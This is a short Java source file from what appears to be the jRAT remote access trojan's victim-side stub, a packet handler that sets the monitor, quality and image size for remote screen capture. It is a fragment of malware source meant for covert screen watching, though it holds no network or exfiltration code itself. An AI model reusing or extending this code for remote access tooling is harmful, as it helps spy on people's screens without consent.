package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Screen;

public class Packet50UpdateRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int monitor = Connection.readInt();
		int quality = Connection.readInt();
		int size = Connection.readInt();
		
		if (Screen.instance != null) {
			Screen.instance.setMonitor(monitor);
			Screen.instance.setQuality(quality);
			Screen.instance.setImageSize(size);
		}
	}

}